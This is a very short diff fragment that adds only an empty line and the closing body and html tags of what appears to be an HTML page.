+
+</body>
+</html>
